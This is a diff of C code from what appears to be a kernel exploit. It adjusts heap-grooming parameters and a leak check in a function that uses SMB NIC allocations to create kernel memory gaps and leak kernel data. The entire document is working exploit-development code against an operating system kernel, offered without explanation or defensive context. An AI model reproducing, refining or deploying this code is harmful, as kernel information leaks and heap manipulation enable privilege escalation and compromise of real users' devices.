@@ -50,7 +50,7 @@ int kmem_zkext_free_kext_leak_nic(smb_nic_allocator allocator, kmem_zkext_neigho
     smb_nic_allocator gap_allocator = smb_nic_allocator_create(addr, sizeof(*addr));
     
     int num_gaps = XE_PAGE_SIZE / 96 * 4;
-    int num_elements_before_gap = 7;
+    int num_elements_before_gap = 1;
     
     for (int gap_idx = 0; gap_idx < num_gaps; gap_idx++) {
         struct network_nic_info elements[num_elements_before_gap];
@@ -58,7 +58,7 @@ int kmem_zkext_free_kext_leak_nic(smb_nic_allocator allocator, kmem_zkext_neigho
         
         for (int element_idx = 0; element_idx < num_elements_before_gap; element_idx++) {
             struct network_nic_info* info = &elements[element_idx];
-            info->nic_index = (gap_idx * num_elements_before_gap + element_idx) * 5;
+            info->nic_index = (gap_idx * num_elements_before_gap + element_idx);
             info->addr_4.sin_len = sizeof(struct sockaddr_in);
             info->addr_4.sin_family = AF_INET;
             info->addr_4.sin_addr.s_addr = info->nic_index;
@@ -92,7 +92,7 @@ int kmem_zkext_free_kext_leak_nic(smb_nic_allocator allocator, kmem_zkext_neigho
     }
         
     struct complete_nic_info_entry* entry = (struct complete_nic_info_entry*)data;
-    if (entry->nic_index > num_gaps * num_elements_before_gap * 5 || entry->next.prev == 0) {
+    if (entry->nic_index > num_gaps * num_elements_before_gap || entry->next.prev == 0) {
         return EIO;
     }
     
